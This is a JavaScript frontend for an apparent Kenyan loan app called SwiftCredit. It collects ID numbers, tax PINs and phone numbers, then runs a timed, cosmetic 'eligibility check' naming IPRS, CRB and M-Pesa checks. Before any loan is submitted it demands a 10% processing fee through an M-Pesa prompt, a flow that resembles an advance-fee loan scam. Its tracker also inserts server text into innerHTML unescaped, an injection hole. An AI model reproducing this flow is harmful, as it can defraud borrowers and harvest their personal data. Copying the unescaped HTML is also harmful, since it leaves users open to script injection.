/* ═══════════════════════════════════════════════
   SwiftCredit — Frontend Logic v4
   Matches index.html v4 class names exactly
═══════════════════════════════════════════════ */

const API = '';

// ── State ─────────────────────────────────────
const S = {
  applicationId:     null,
  refNumber:         null,
  firstName:         '',
  lastName:          '',
  phone:             '',
  creditScore:       0,
  maxLoan:           0,
  loanAmount:        10000,
  tenor:             3,
  monthlyPayment:    0,
  processingFee:     0,
  transactionId:     null,
  pollInterval:      null,
  countdownInterval: null,
};

let currentTenor = 3;

// ── Helpers ───────────────────────────────────
const delay  = ms => new Promise(r => setTimeout(r, ms));
const fmt    = n  => Number(n).toLocaleString('en-KE');
const el     = id => document.getElementById(id);
const setText = (id, v) => { const e = el(id); if (e) e.textContent = v; };

// ── Toast ─────────────────────────────────────
let _tt;
function toast(msg, type = 'info') {
  const t = el('toast');
  el('toast-icon').textContent = type === 'success' ? '✅' : type === 'error' ? '❌' : 'ℹ️';
  el('toast-msg').textContent  = msg;
  t.className = `toast show${type === 'success' ? ' t-ok' : type === 'error' ? ' t-err' : ''}`;
  clearTimeout(_tt);
  _tt = setTimeout(() => t.classList.remove('show'), 4500);
}

// ── Page Navigation ───────────────────────────
function showPage(id) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  const p = el('page-' + id);
  if (p) { p.classList.add('active'); window.scrollTo(0, 0); }
}

// ── Step Navigation ───────────────────────────
function showStep(id) {
  document.querySelectorAll('.app-step').forEach(s => s.classList.remove('active'));
  const s = el(id);
  if (s) { s.classList.add('active'); window.scrollTo(0, 0); }
}

// ── Sidebar Progress ──────────────────────────
function setStep(n) {
  document.querySelectorAll('.pr-step').forEach(s => {
    const sn = parseInt(s.dataset.step);
    s.classList.remove('active', 'done');
    const c = s.querySelector('.pr-circle');
    if (sn < n)       { s.classList.add('done');   c.textContent = '✓'; }
    else if (sn === n) { s.classList.add('active'); c.textContent = sn; }
    else               {                            c.textContent = sn; }
  });
}

// ── Field Validation Helpers ──────────────────
function fErr(id, show, msg) {
  const e = el('err-' + id);
  const i = el(id);
  if (e) { if (msg) e.textContent = msg; e.classList.toggle('show', show); }
  if (i) i.classList.toggle('err', show);
}
function clearErrs() {
  document.querySelectorAll('.ferr').forEach(e  => e.classList.remove('show'));
  document.querySelectorAll('.inp.err').forEach(i => i.classList.remove('err'));
}

// ══════════════════════════════════════════════
// STEP 1 — Personal Info
// ══════════════════════════════════════════════
async function submitPersonalInfo() {
  clearErrs();

  const fName  = el('firstName').value.trim();
  const lName  = el('lastName').value.trim();
  const idNum  = el('idNumber').value.trim();
  const rawPh  = el('phoneNumber').value.trim();
  const dob    = el('dob').value;
  const gender = el('gender').value;
  const emp    = el('employment').value;
  const inc    = el('income').value;
  const purp   = el('loanPurpose').value;
  const ok     = el('consent').checked;

  let valid = true;

  if (!fName)                 { fErr('firstName', true); valid = false; }
  if (!lName)                 { fErr('lastName',  true); valid = false; }
  if (!/^\d{8}$/.test(idNum)) { fErr('idNumber',  true); valid = false; }

  const ph = rawPh.replace(/^0/, '').replace(/\s/g, '');
  if (!/^[17]\d{8}$/.test(ph)) { fErr('phone', true); valid = false; }

  if (!dob) {
    fErr('dob', true, 'Date of birth is required'); valid = false;
  } else {
    const age = Math.floor((Date.now() - new Date(dob)) / (365.25 * 24 * 3600 * 1000));
    if (age < 18) { fErr('dob', true, 'You must be at least 18 years old'); valid = false; }
  }

  if (!inc || Number(inc) < 1) { fErr('income', true); valid = false; }

  if (!ok)    { toast('Please accept the terms and conditions to continue', 'error'); return; }
  if (!valid) { toast('Please fix the highlighted fields above', 'error'); return; }

  const btn = document.querySelector('#step-personal .btn-p');
  btn.disabled = true; btn.textContent = 'Please wait…';

  try {
    const res  = await fetch(`${API}/api/application/start`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        firstName:   fName,
        lastName:    lName,
        idNumber:    idNum,
        kraPin:      el('kraPin').value.trim(),
        phone:       '0' + ph,
        dob, gender,
        employment:  emp,
        income:      Number(inc),
        email:       el('email').value.trim(),
        loanPurpose: purp,
      }),
    });
    const data = await res.json();

    if (!res.ok) {
      toast(data.error || 'Error saving application. Please retry.', 'error');
      btn.disabled = false; btn.textContent = 'Continue to Eligibility Check →';
      return;
    }

    S.applicationId = data.applicationId;
    S.refNumber     = data.refNumber;
    S.firstName     = fName;
    S.lastName      = lName;
    S.phone         = ph;

    // Pre-fill payment phone
    const pp = el('payPhone');
    if (pp) pp.value = ph;

    showPage('apply');
    showStep('step-eligibility');
    setStep(2);
    runEligibilityCheck();

  } catch {
    toast('Network error. Check your connection and retry.', 'error');
    btn.disabled = false; btn.textContent = 'Continue to Eligibility Check →';
  }
}

// ══════════════════════════════════════════════
// STEP 2 — Eligibility Check
// ══════════════════════════════════════════════
const CK_LABELS = [
  'Verifying identity with IPRS…',
  'Running CRB credit bureau check…',
  'Validating Safaricom number…',
  'Analysing M-Pesa activity…',
  'Calculating your risk score…',
];

async function runEligibilityCheck() {
  el('elig-checking').style.display = 'block';
  el('elig-result').style.display   = 'none';

  const ids = ['ci-1','ci-2','ci-3','ci-4','ci-5'];
  let i = 0;

  async function tick() {
    if (i > 0) {
      const prev = el(ids[i - 1]);
      prev.classList.remove('running');
      prev.classList.add('done');
      prev.querySelector('.ck-dot').textContent = '✓';
    }
    if (i < ids.length) {
      el(ids[i]).classList.add('running');
      setText('ck-status', CK_LABELS[i]);
      i++;
      await delay(900 + Math.random() * 500);
      tick();
    } else {
      try {
        const res  = await fetch(`${API}/api/application/eligibility/${S.applicationId}`, { method: 'POST' });
        const data = await res.json();
        if (!res.ok || !data.eligible) {
          showIneligible(data.creditScore || 0);
        } else {
          S.creditScore = data.creditScore;
          S.maxLoan     = data.maxLoan;
          showEligible(data);
        }
      } catch {
        toast('Eligibility check failed. Please try again.', 'error');
      }
    }
  }
  tick();
}

function showEligible(data) {
  el('elig-checking').style.display = 'none';
  el('elig-result').style.display   = 'block';

  setText('m-maxloan', `KES ${fmt(data.maxLoan)}`);
  setText('m-score',   data.creditScore);

  const cap    = Math.min(data.maxLoan, 115000);
  const slider = el('loanSlider');
  if (slider) {
    slider.max   = cap;
    slider.value = Math.min(parseInt(slider.value), cap);
    S.loanAmount = parseInt(slider.value);
    setText('slider-max-lbl', `KES ${fmt(cap)}`);
    setText('loan-display',   fmt(S.loanAmount));
  }
  calcTerms();
}

function showIneligible(score) {
  el('elig-checking').style.display = 'none';
  el('elig-result').style.display   = 'block';

  const head = el('res-head');
  head.className = 'res-head fail';
  el('res-icon').textContent  = '❌';
  el('res-title').textContent = 'Not Eligible at This Time';
  el('res-title').className   = 'res-title fail';
  el('res-sub').textContent   =
    'Your profile does not currently meet our lending criteria. You may re-apply after 90 days.';
  setText('m-score',   score || '—');
  setText('m-maxloan', '—');
  el('res-metrics').style.opacity = '0.4';
  el('elig-btn').style.display    = 'none';
}

function goToLoanSelection() {
  showStep('step-loan');
  setStep(3);
  calcTerms();
}

// ══════════════════════════════════════════════
// STEP 3 — Loan Selection
// ══════════════════════════════════════════════
function calcProcessingFee(amount) {
  return Math.round(amount * 0.10);
}

function calcTerms() {
  const amt  = S.loanAmount;
  const m    = currentTenor;
  const r    = 0.12 / 12;

  const monthly =
    m === 1
      ? amt * (1 + r)
      : amt * (r * Math.pow(1 + r, m)) / (Math.pow(1 + r, m) - 1);

  const total    = monthly * m;
  const interest = total - amt;
  const fee      = calcProcessingFee(amt);

  S.monthlyPayment = Math.round(monthly);
  S.processingFee  = fee;

  setText('ls-monthly',  `KES ${fmt(Math.round(monthly))}`);
  setText('ls-interest', `KES ${fmt(Math.round(interest))}`);
  setText('ls-total',    `KES ${fmt(Math.round(total))}`);
  setText('ls-fee',      `KES ${fmt(fee)}`);
  setText('fee-live',    `KES ${fmt(fee)}`);
}

function updateLoanDisplay() {
  const slider = el('loanSlider');
  S.loanAmount = parseInt(slider.value);
  setText('loan-display', fmt(S.loanAmount));
  // Deselect all quick-select buttons
  document.querySelectorAll('.qs-btn').forEach(b => b.classList.remove('on'));
  calcTerms();
}

function setLoanAmount(amt) {
  const cap    = Math.min(S.maxLoan || 115000, 115000);
  const actual = Math.min(Math.max(amt, 1000), cap);
  const slider = el('loanSlider');
  slider.value = actual;
  S.loanAmount = actual;
  setText('loan-display', fmt(actual));

  // Highlight matching quick-select button
  document.querySelectorAll('.qs-btn').forEach(b => {
    const raw = b.textContent.trim().toUpperCase();
    const val = parseInt(raw.replace(/[^\d]/g, '')) * (raw.includes('K') ? 1000 : 1);
    b.classList.toggle('on', val === amt && actual === amt);
  });
  calcTerms();
}

function setTenor(el, months) {
  document.querySelectorAll('.tenor-pill').forEach(p => p.classList.remove('on'));
  el.classList.add('on');
  currentTenor = months;
  S.tenor      = months;
  calcTerms();
}

async function proceedToPayment() {
  const btn = document.querySelector('#step-loan .btn-p');
  btn.disabled = true; btn.textContent = 'Saving selection…';

  try {
    const res  = await fetch(`${API}/api/application/select/${S.applicationId}`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ loanAmount: S.loanAmount, tenor: currentTenor }),
    });
    const data = await res.json();

    if (!res.ok) {
      toast(data.error || 'Error saving loan selection', 'error');
      btn.disabled = false; btn.textContent = 'Proceed to Payment →';
      return;
    }

    S.processingFee  = data.processingFee;
    S.monthlyPayment = data.monthlyPayment;

    // Populate payment step UI
    setText('ft-amount', `KES ${fmt(S.loanAmount)}`);
    setText('ft-pct',    `KES ${fmt(S.processingFee)}`);
    setText('ft-total',  `KES ${fmt(S.processingFee)}`);
    setText('btn-fee',   fmt(S.processingFee));
    setText('waiting-fee', `KES ${fmt(S.processingFee)}`);

    showStep('step-payment');
    setStep(4);
    btn.disabled = false; btn.textContent = 'Proceed to Payment →';

  } catch {
    toast('Network error. Please try again.', 'error');
    btn.disabled = false; btn.textContent = 'Proceed to Payment →';
  }
}

// ══════════════════════════════════════════════
// STEP 4 — M-Pesa STK Push
// ══════════════════════════════════════════════
async function initiateSTK() {
  const raw = el('payPhone').value.trim();
  const ph  = raw.replace(/^0/, '').replace(/\s/g, '');

  if (!/^[17]\d{8}$/.test(ph)) {
    toast('Enter a valid Safaricom number (07XX or 01XX)', 'error');
    return;
  }

  const btn = el('stk-btn');
  btn.disabled = true; btn.textContent = 'Sending prompt…';

  try {
    const res  = await fetch(`${API}/api/mpesa/pay`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        applicationId: S.applicationId,
        phone: '0' + ph,
      }),
    });
    const data = await res.json();

    if (!res.ok || !data.transactionId) {
      toast(data.error || 'Could not send STK push. Please retry.', 'error');
      resetPayInit();
      return;
    }

    S.transactionId = data.transactionId;
    el('pay-init').style.display    = 'none';
    el('pay-waiting').style.display = 'block';
    startCountdown(120);
    startPolling();

  } catch {
    toast('Network error. Please try again.', 'error');
    resetPayInit();
  }
}

function resetPayInit() {
  const btn = el('stk-btn');
  btn.disabled = false;
  btn.innerHTML = `📱 Send M-Pesa Prompt — KES <span id="btn-fee">${fmt(S.processingFee)}</span>`;
}

function startCountdown(secs) {
  clearInterval(S.countdownInterval);
  let s = secs;
  setText('countdown', s);
  S.countdownInterval = setInterval(() => {
    s--;
    setText('countdown', s);
    if (s <= 0) {
      clearInterval(S.countdownInterval);
      clearInterval(S.pollInterval);
      toast('Payment timed out. Please try again.', 'error');
      el('pay-waiting').style.display = 'none';
      el('pay-init').style.display    = 'block';
      resetPayInit();
    }
  }, 1000);
}

function startPolling() {
  clearInterval(S.pollInterval);
  S.pollInterval = setInterval(async () => {
    try {
      const res  = await fetch(`${API}/api/mpesa/status/${S.transactionId}`);
      const data = await res.json();
      if (data.status === 'success') {
        clearInterval(S.pollInterval);
        clearInterval(S.countdownInterval);
        onPaymentSuccess(data.mpesaCode);
      } else if (data.status === 'failed') {
        clearInterval(S.pollInterval);
        clearInterval(S.countdownInterval);
        toast('Payment failed or cancelled. Please try again.', 'error');
        el('pay-waiting').style.display = 'none';
        el('pay-init').style.display    = 'block';
        resetPayInit();
      }
    } catch { /* network blip — keep polling */ }
  }, 2500);
}

function resendSTK() {
  clearInterval(S.pollInterval);
  clearInterval(S.countdownInterval);
  el('pay-waiting').style.display = 'none';
  el('pay-init').style.display    = 'block';
  resetPayInit();
  toast('You can now resend the M-Pesa prompt.', 'info');
}

async function onPaymentSuccess(mpesaCode) {
  el('pay-waiting').style.display   = 'none';
  el('pay-confirmed').style.display = 'block';
  setText('mpesa-code-display', mpesaCode || 'Confirmed');

  await delay(2800);

  try {
    const res  = await fetch(`${API}/api/application/submit/${S.applicationId}`, { method: 'POST' });
    const data = await res.json();

    if (res.ok) {
      setText('success-ref', data.refNumber || S.refNumber);
      setText('s-amount',    `KES ${fmt(S.loanAmount)}`);
      setText('s-tenor',     `${currentTenor} Month${currentTenor > 1 ? 's' : ''}`);
      setText('s-monthly',   `KES ${fmt(S.monthlyPayment)}`);
      showPage('success');
    } else {
      toast(data.error || 'Submission error. Please contact support.', 'error');
    }
  } catch {
    toast('Network error during submission. Call +254 700 000 000.', 'error');
  }
}

// ── Application Tracker ───────────────────────
async function trackApplication() {
  const ref = (el('track-ref') || {}).value || '';
  if (!ref.trim()) { toast('Enter your reference number', 'error'); return; }
  try {
    const res  = await fetch(`${API}/api/application/track/${ref.trim()}`);
    const data = await res.json();
    const out  = el('track-result');
    if (!res.ok) {
      out.innerHTML = `<div class="info-note" style="color:var(--danger)">❌ ${data.error}</div>`;
      return;
    }
    const colours = {
      pending:'#D97706', approved:'#059669',
      rejected:'#DC2626', disbursed:'#2563EB', review:'#7C3AED'
    };
    out.innerHTML = `
      <div class="res-panel">
        <div class="res-head ok" style="background:var(--surf)">
          <div class="res-icon">📋</div>
          <div>
            <div class="res-title ok" style="color:var(--ink)">${data.refNumber}</div>
            <div class="res-sub">${data.firstName}'s application</div>
          </div>
        </div>
        <div style="padding:18px 24px">
          <p style="font-size:14px;color:var(--muted);margin-bottom:6px">
            Amount: <strong>KES ${fmt(data.loanAmount || 0)}</strong>
          </p>
          <p style="font-size:14px;color:var(--muted);margin-bottom:6px">
            Tenor: <strong>${data.tenor || '—'} months</strong>
          </p>
          <p style="font-size:14px">
            Status: <strong style="color:${colours[data.status] || '#333'}">${(data.status || '').toUpperCase()}</strong>
          </p>
        </div>
      </div>`;
  } catch {
    toast('Network error. Please try again.', 'error');
  }
}

// ── Init ──────────────────────────────────────
calcTerms();
